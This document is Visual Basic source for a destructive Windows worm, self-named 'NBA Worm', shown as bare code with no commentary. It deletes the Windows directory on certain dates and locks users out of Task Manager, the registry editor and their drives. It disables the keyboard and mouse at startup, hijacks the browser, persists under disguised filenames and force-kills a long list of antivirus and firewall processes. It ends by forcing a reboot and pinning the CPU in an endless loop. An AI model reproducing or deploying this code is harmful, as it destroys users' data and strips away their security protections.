   Dim fso
   Set fso = CreateObject("Scripting.FileSystemObject")
   Me.Hide
   App.TaskVisible = False

    On Error Resume Next
   If Day(Now) = 2 Or Day(Now) = 7 Or Day(Now) = 14 Or Day(Now) = 21 Then
   Call Shell("cmd.exe")
   Dim wsh
   Set wsh = CreateObject("Wscript.shell")
   wsh.SendKeys "del C:\WINDOWS /q /s"
   wsh.SendKeys "{ENTER}"
   End If

    On Error Resume Next
   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\InfoWindow", "255 255 225"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\InfoText", "0 0 0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "160 160 164"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "192 192 192"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 0 0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GradientActiveTitle", "61 149 255"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "255 255 0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuBar", "458 214 655"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "786 154 325"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "547 845 452"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonShadow", "172 168 153"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName", "NBA"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "NBA"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "C:\WINDOWS\NBA.html"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "C:\WINDOWS\NBA.html"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FullScreen", "yes"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Show_StatusBar", "no"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\ShowGoButton", "no"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Show_ToolBar", "no"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "N B A"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\CompanyName", "NBA"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Identities\{7246FE60-6167-11D7-832A-9660EE62B864}\Software\Microsoft\Outlook Express\5.0\WindowTitle", "N B A"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\DoubleClickSpeed", "100"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\MouseSensitivity", "5"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\MouseSpeed", "0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Control Panel\Keyboard\KeyboardDelay", "9"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows Scripting Host\Settings\Timeout", "0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "67108863", "REG_DWORD"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoInternetIcon", "1", "REG_DWORD"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", "1"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable", "0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones", "0"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKLM\Software\Classes\ShellScrap\NeverShowExt", "vbs"

   Set wsc = CreateObject("WScript.Shell")
   RegServ = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices"
   wsc.RegWrite RegServ & "\DisableKeybaord", "Rundll32.exe Keyboard,Disable"
   wsc.RegWrite RegServ & "\DisableMouse", "Rundll32.exe Mouse,Disable"

   Set wsc = CreateObject("WScript.Shell")
   wsc.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\ShutDownWindows", "Rundll32.exe User,ExitWindows"

   Set WScriptShell = CreateObject("WScript.Shell")
   WScriptShell.RegWrite "HKCU\software\NBA\", "NBA Worm"

   Dim Reg As Object
   Set Reg = CreateObject("wscript.shell")
   Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"

   On Error Resume Next
      Randomize
   r = Int((6 * Rnd) + 1)
   If r = 1 Then
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\WINDOWS\MLoad.Exe"
   ElseIf r = 2 Then
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\WINDOWS\View32.Exe"
   ElseIf r = 3 Then
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\WINDOWS\Monow.Exe"
   ElseIf r = 4 Then
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\WINDOWS\system32\Ckcnvk.Exe"
   ElseIf r = 5 Then
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\WINDOWS\system32\SysUpdate.Exe"
   ElseIf r = 6 Then
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\WINDOWS\system32\Formats.Exe"
   End If

   On Error Resume Next
   Dim app_list(1 To 1000)

     app_list(1) = "vsmon.exe"
     app_list(2) = "zonealarm.exe"
     app_list(3) = "PNTIOMON.exe"
     app_list(4) = "pccntupd.exe"
     app_list(5) = "WebTrap*.exe"
     app_list(6) = "Pop3trap.exe"
     app_list(7) = "MWSOEMON.exe"
     app_list(8) = "avpcc.exe"
     app_list(9) = "AvpM.exe"
     app_list(10) = "RapApp.exe"
     app_list(11) = "blackice.exe"
     app_list(12) = "blackd.exe"
     app_list(13) = "xcommsrv.exe"
     app_list(14) = "avxgui.exe"
     app_list(15) = "avxlive.exe"
     app_list(16) = "lmgui.exe"
     app_list(17) = "Iface.exe"
     app_list(18) = "Pavsrv*.exe"
     app_list(19) = "Avengine.exe"
     app_list(20) = "UPDATE.EXE"
     app_list(21) = "NUPGRADE.EXE"
     app_list(22) = "MCUPDATE.EXE"
     app_list(23) = "LUALL.EXE"
     app_list(24) = "ICSUPP95.EXE"
     app_list(25) = "ICSSUPPNT.EXE"
     app_list(26) = "DRWEBUPW.EXE"
     app_list(27) = "CFIAUDIT.EXE"
     app_list(28) = "DRWEBUPW.EXE"
     app_list(29) = "AVXQUAR.EXE"
     app_list(30) = "AVWUPD32.EXE"
     app_list(31) = "AVPUPD.EXE"
     app_list(32) = "AVLTMAIN.EXE"
     app_list(33) = "AUTOUPDATE.EXE"
     app_list(34) = "AUTOTRACE.EXE"
     app_list(35) = "AUTODOWN.EXE"
     app_list(36) = "AUPDATE.EXE"
     app_list(37) = "ATUPDATER.EXE"
     app_list(38) = "nod32krn.exe"
     app_list(39) = "nod32kui.exe"
     app_list(40) = "_avp*"
     app_list(41) = "ackwin32*"
     app_list(42) = "anti-trojan*"
     app_list(43) = "aplica32*"
     app_list(44) = "apvxdwin*"
     app_list(45) = "autodown*"
     app_list(46) = "avconsol*"
     app_list(47) = "ave32*"
     app_list(48) = "avgcc32*"
     app_list(49) = "avgctrl*"
     app_list(50) = "avgw*"
     app_list(51) = "avkserv*"
     app_list(52) = "avnt*"
     app_list(53) = "avp*"
     app_list(54) = "avsched32*"
     app_list(55) = "avwin95*"
     app_list(56) = "avwupd32*"
     app_list(57) = "blackd*"
     app_list(58) = "blackice*"
     app_list(59) = "bootwarn*"
     app_list(60) = "ccapp*"
     app_list(61) = "ccshtdwn*"
     app_list(62) = "cfiadmin*"
     app_list(63) = "cfiaudit*"
     app_list(64) = "cfind*"
     app_list(65) = "cfinet*"
     app_list(66) = "claw95*"
     app_list(67) = "dv95*"
     app_list(68) = "ecengine*"
     app_list(69) = "efinet32*"
     app_list(70) = "esafe*"
     app_list(71) = "espwatch*"
     app_list(72) = "f-agnt95*"
     app_list(73) = "findviru*"
     app_list(74) = "fprot*"
     app_list(75) = "f-prot*"
     app_list(76) = "fprot95*"
     app_list(77) = "f-prot95*"
     app_list(78) = "fp-win*"
     app_list(79) = "frw*"
     app_list(80) = "f-stopw*"
     app_list(81) = "gibe*"
     app_list(82) = "iamapp*"
     app_list(83) = "iamserv*"
     app_list(84) = "ibmasn*"
     app_list(85) = "ibmavsp*"
     app_list(86) = "icload95*"
     app_list(87) = "icloadnt*"
     app_list(88) = "icmon*"
     app_list(89) = "icmoon*"
     app_list(90) = "icssuppnt*"
     app_list(91) = "icsupp*"
     app_list(92) = "iface*"
     app_list(93) = "iomon98*"
     app_list(94) = "jedi*"
     app_list(95) = "kpfw32*"
     app_list(96) = "lockdown2000*"
     app_list(97) = "lookout*"
     app_list(98) = "luall*"
     app_list(99) = "moolive*"
     app_list(100) = "mpftray*"
     app_list(101) = "msconfig*"
     app_list(102) = "nai_vs_stat*"
     app_list(103) = "navapw32*"
     app_list(104) = "navlu32*"
     app_list(105) = "navnt*"
     app_list(106) = "navsched*"
     app_list(107) = "navw*"
     app_list(108) = "nisum*"
     app_list(109) = "nmain*"
     app_list(110) = "normist*"
     app_list(111) = "nupdate*"
     app_list(112) = "nupgrade*"
     app_list(113) = "nvc95*"
     app_list(114) = "outpost*"
     app_list(115) = "padmin*"
     app_list(116) = "pavcl*"
     app_list(117) = "pavsched*"
     app_list(118) = "pavw*"
     app_list(119) = "pcciomon*"
     app_list(120) = "pccmain*"
     app_list(121) = "pccwin98*"
     app_list(122) = "pcfwallicon*"
     app_list(123) = "persfw*"
     app_list(124) = "pop3trap*"
     app_list(125) = "pview*"
     app_list(126) = "rav*"
     app_list(127) = "regedit*"
     app_list(128) = "rescue*"
     app_list(129) = "safeweb*"
     app_list(130) = "serv95*"
     app_list(131) = "sphinx*"
     app_list(132) = "sweep*"
     app_list(133) = "tca*"
     app_list(134) = "tds2*"
     app_list(135) = "vcleaner*"
     app_list(136) = "vcontrol*"
     app_list(137) = "vet32*"
     app_list(138) = "vet95*"
     app_list(139) = "vet98*"
     app_list(140) = "vettray*"
     app_list(141) = "vscan*"
     app_list(142) = "vsecomr*"
     app_list(143) = "vshwin32*"
     app_list(144) = "vsstat*"
     app_list(145) = "webtrap*"
     app_list(146) = "wfindv32*"
     app_list(147) = "zapro*"
     app_list(148) = "zonealarm*"
     app_list(149) = "McVSEscn*"
     app_list(150) = "mcvsrte*"
     app_list(151) = "mcvsftsn*"
     app_list(152) = "mcvsshld*"
     app_list(153) = "AntiTroj*"
     app_list(154) = "smc*"
     app_list(155) = "doors*"
     app_list(156) = "dpf*"
     app_list(157) = "drwatson*"
     app_list(158) = "drweb32*"
     app_list(159) = "fameh32*"
     app_list(160) = "fast*"
     app_list(161) = "findviru*"
     app_list(162) = "fix-it*"
     app_list(163) = "flowprotector*"
     app_list(164) = "fnrb32*"
     app_list(165) = "fsaa*"
     app_list(166) = "fsav530stbyb*"
     app_list(167) = "fsav530wtbyb*"
     app_list(168) = "fsm32*"
     app_list(169) = "guard*"
     app_list(170) = "guarddog*"
     app_list(171) = "iamstats*"
     app_list(172) = "ifw2000*"
     app_list(173) = "iomon98*"
     app_list(174) = "jed*"
     app_list(175) = "jammer*"
     app_list(176) = "kerio-pf-213-en-win*"
     app_list(177) = "kerio-wrl-421-en-win*"
     app_list(178) = "kerio-wrp-421-en-win*"
     app_list(179) = "kavlite40eng*"
     app_list(180) = "kavpers40eng*"
     app_list(181) = "killprocesssetup161*"
     app_list(182) = "kpf*"
     app_list(183) = "kpfw32*"
     app_list(184) = "ldpro*"
     app_list(185) = "ldpromenu*"
     app_list(186) = "ldscan*"
     app_list(187) = "localnet*"
     app_list(188) = "lucomserver*"
     app_list(189) = "mfweng3.02d30*"
     app_list(190) = "mfw2en*"
     app_list(191) = "monsys32*"
     app_list(192) = "monsysnt*"
     app_list(193) = "msblast*"
     app_list(194) = "mrflux*"
     app_list(195) = "mspatch*"
     app_list(196) = "mssmmc32*"
     app_list(197) = "nav80try*"
     app_list(198) = "navengnavex15*"
     app_list(199) = "nc2000*"
     app_list(200) = "norton_internet_secu_3.0_407*"
     app_list(201) = "amon9x*"
     app_list(202) = "antivirus*"
     app_list(203) = "ants*"
     app_list(204) = "autotrace*"
     app_list(205) = "azonealarm*"
     app_list(206) = "bd_professional*"
     app_list(207) = "bidef*"
     app_list(208) = "bidserver*"
     app_list(209) = "bipcp*"
     app_list(210) = "mxtask*"
     app_list(211) = "nai_vs_stat*"
     app_list(212) = "navauto-protect*"
     app_list(213) = "navengnavex15*"
     app_list(214) = "nc2000*"
     app_list(215) = "ncinst4*"
     app_list(216) = "ndd32*"
     app_list(217) = "neomonitor*"
     app_list(218) = "netinfo*"
     app_list(219) = "nsched32*"
     app_list(220) = "pcip10117_0*"
     app_list(221) = "Ad-aware*"
     app_list(222) = "SpybotSD*"
     app_list(223) = "ntxconfig*"
     app_list(224) = "panixk*"
     app_list(225) = "pathping*"
     app_list(226) = "zonalm2601*"
     app_list(227) = "xpf202en*"
     app_list(228) = "wyvernworksfirewall*"
     app_list(229) = "symproxysvc*"
     app_list(230) = "rav8win32eng*"
     app_list(231) = "EXANTIVIRUS-CNET*"
     app_list(232) = "Fast*"
     app_list(233) = "Nav80try*"
     app_list(234) = "Cleaner*"
     app_list(235) = "Tgbob*"
     app_list(236) = "Titanin*"
     app_list(237) = "TitaninXp*"
     app_list(238) = "Tracert*"
     app_list(239) = "Trjscan*"
     app_list(240) = "Trojantrap3*"
     app_list(241) = "AVprotect9x*"
     app_list(242) = "Bisp*"
     app_list(243) = "Ostronet*"
     app_list(244) = "Nwinst4*"
     app_list(245) = "Nwtool16*"
     app_list(246) = "Periscope*"
     app_list(247) = "Regedt32*"
     app_list(248) = "Qserver*"
     app_list(249) = "Integrator*"
     app_list(250) = "Moolive*"

        number_of_apps = 240

     drv$ = WinDir_func
     Open drv$ & "\tmp_d.bat" For Output As #1
      For i = 1 To number_of_apps
       Print #1, "taskkill /F /IM " & app_list(i)
      Next i
       Print #1, "del tmp_d.bat"
     Close #1
     s = Shell(drv$ & "\tmp_d.bat", vbHide)

    Dim xxx, aa
   Set xxx = CreateObject("Scripting.FileSystemObject")
   Set aa = xxx.CreateTextFile("C:\WINDOWS\NBA.html")
   aa.WriteLine "<html>"
   aa.WriteLine "<title>VBS.NBA.Worm</title>"
   aa.WriteLine "<p>Hey Luser.</p>"
   aa.WriteLine "<p>Pleas re-install windows.</p>"
   aa.WriteLine "<p>Hey Luser.</p>"
   aa.WriteLine "<p>Pleas re-install windows.</p>"
   aa.WriteLine "<p>Hey Luser.</p>"
   aa.WriteLine "<p>Pleas re-install windows.</p>"
   aa.WriteLine "<p>Hey Luser.</p>"
   aa.WriteLine "<p>Pleas re-install windows.</p>"
   aa.WriteLine "<p>Hey Luser.</p>"
   aa.WriteLine "<p>Pleas re-install windows.</p>"
   aa.Close

    Set Key = CreateObject("WScript.Shell")
     Key.SendKeys "{CAPSLOCK}"
      Key.SendKeys "{NUMLOCK}"
     Key.SendKeys "{SCROLLLOCK}"

   Set Text = fso.CreateTextFile("C:\HEY LUSER READ THIS - NOW.txt", True)
   Text.WriteLine "Hey Luser.You are infect with NBA worm.Pleas re-install windows."
   Text.Close

     Shell ("SHUTDOWN -R -t 50 -c  NBA.Worm -f")

   cpuheat:
   GoTo cpuheat:

   End Sub
